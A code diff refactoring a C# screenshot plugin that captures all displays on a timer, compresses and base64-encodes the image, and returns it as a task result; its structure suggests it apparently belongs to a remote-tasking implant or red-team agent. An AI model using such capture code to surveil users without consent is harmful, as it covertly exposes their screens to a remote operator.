@@ -18,12 +18,12 @@ namespace Agent
     {
         public string Name => "screenshot";
         private IMessageManager messageManager { get; set; }
-        private System.Timers.Timer? screenshotTimer;
-        public CancellationTokenSource cts = new CancellationTokenSource();
+        private readonly ScreenshotScheduler scheduler;
 
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
+            scheduler = new ScreenshotScheduler((taskId, _) => CaptureAndSendScreenshot(taskId));
         }
 
         [System.Runtime.Versioning.SupportedOSPlatform("windows")]
@@ -36,24 +36,15 @@ namespace Agent
 
             if (args.interval <= 0)
             {
+                scheduler.Cancel(job.task.id);
                 await CaptureAndSendScreenshot(job.task.id);
-                cts.Cancel();
             }
             else
             {
-                cts = new CancellationTokenSource();
-                screenshotTimer = new System.Timers.Timer(args.interval * 1000); // Convert seconds to milliseconds
-                screenshotTimer.Elapsed += async (sender, e) =>
-                {
-                    if (!cts.Token.IsCancellationRequested)
-                    {
-                        await CaptureAndSendScreenshot(job.task.id);
-                    }
-                };
-
-                // Set AutoReset to false for a one-time execution if the interval is greater than 0
-                screenshotTimer.AutoReset = args.interval > 0;
-                screenshotTimer.Enabled = true;
+                scheduler.Schedule(
+                    job.task.id,
+                    TimeSpan.FromSeconds(args.interval),
+                    job.cancellationtokensource.Token);
                 messageManager.AddTaskResponse(new TaskResponse
                 {
                     completed = true,
@@ -63,66 +54,62 @@ namespace Agent
             }
         }
         [System.Runtime.Versioning.SupportedOSPlatform("windows")]
-        private async Task CaptureAndSendScreenshot(string task_id)
+        private Task CaptureAndSendScreenshot(string taskId)
         {
             try
             {
                 var bitmaps = ScreenCapture.Capture();
-
-                // Determine the size of the combined bitmap
-                int combinedWidth = 0;
-                int maxHeight = 0;
-                foreach (var bitmap in bitmaps)
+                try
                 {
-                    combinedWidth += bitmap.Width;
-                    if (bitmap.Height > maxHeight)
+                    if (bitmaps.Count == 0)
                     {
-                        maxHeight = bitmap.Height;
+                        throw new InvalidOperationException("No displays were available for capture.");
                     }
-                }
 
-                // Create a new bitmap to hold the combined image
-                var combinedBitmap = new Bitmap(combinedWidth, maxHeight);
-
-                // Draw each screen's bitmap onto the combined bitmap
-                int x = 0;
-                foreach (var bitmap in bitmaps)
-                {
+                    var combinedWidth = bitmaps.Sum(bitmap => bitmap.Width);
+                    var maxHeight = bitmaps.Max(bitmap => bitmap.Height);
+                    using var combinedBitmap = new Bitmap(combinedWidth, maxHeight);
                     using (var graphics = Graphics.FromImage(combinedBitmap))
                     {
-                        graphics.DrawImage(bitmap, x, 0);
+                        var x = 0;
+                        foreach (var bitmap in bitmaps)
+                        {
+                            graphics.DrawImage(bitmap, x, 0);
+                            x += bitmap.Width;
+                        }
                     }
-                    x += bitmap.Width;
-                }
 
-                // Convert to base64
-                var converter = new ImageConverter();
-                var combinedBitmapBytes = (byte[])converter.ConvertTo(combinedBitmap, typeof(byte[]));
-                byte[] outputBytes;
-
-                // Compress the image
-                using (var memoryStream = new MemoryStream())
-                {
-                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
+                    var converter = new ImageConverter();
+                    var bitmapBytes = (byte[]?)converter.ConvertTo(combinedBitmap, typeof(byte[]))
+                        ?? throw new InvalidOperationException("Screenshot encoding returned no data.");
+                    using var memoryStream = new MemoryStream();
+                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true))
                     {
-                        gzipStream.Write(combinedBitmapBytes, 0, combinedBitmapBytes.Length);
+                        gzipStream.Write(bitmapBytes, 0, bitmapBytes.Length);
                     }
-                    outputBytes = memoryStream.ToArray();
-                }
 
-                var combinedBitmapBase64 = Convert.ToBase64String(outputBytes);
-                messageManager.AddTaskResponse(new TaskResponse
+                    messageManager.AddTaskResponse(new TaskResponse
+                    {
+                        completed = true,
+                        user_output = "Screenshot captured.",
+                        task_id = taskId,
+                        process_response = new Dictionary<string, string>
+                        {
+                            { "message", Convert.ToBase64String(memoryStream.ToArray()) }
+                        },
+                    });
+                }
+                finally
                 {
-                    completed = true,
-                    user_output = "Screenshot captured.",
-                    task_id = task_id,
-                    process_response = new Dictionary<string, string> { { "message", combinedBitmapBase64 } },
-                });
+                    foreach (var bitmap in bitmaps) bitmap.Dispose();
+                }
             }
-            catch (Exception e)
+            catch (Exception exception)
             {
-                messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
+                messageManager.Write($"Failed to capture screenshot: {exception}", taskId, true, "error");
             }
+
+            return Task.CompletedTask;
         }
     }
     [System.Runtime.Versioning.SupportedOSPlatform("windows")]
@@ -130,17 +117,21 @@ namespace Agent
     {
         internal static List<Bitmap> Capture()
         {
-            var bitmaps = new List<Bitmap>();
-            foreach (var screen in GetScreens())
+            return DisposableCollector.Collect(GetScreens(), screen =>
             {
                 var bitmap = new Bitmap(screen.Width, screen.Height);
-                using (var graphics = Graphics.FromImage(bitmap))
+                try
                 {
+                    using var graphics = Graphics.FromImage(bitmap);
                     graphics.CopyFromScreen(screen.X, screen.Y, 0, 0, bitmap.Size);
+                    return bitmap;
                 }
-                bitmaps.Add(bitmap);
-            }
-            return bitmaps;
+                catch
+                {
+                    bitmap.Dispose();
+                    throw;
+                }
+            });
         }
 
         private static IEnumerable<Screen> GetScreens()
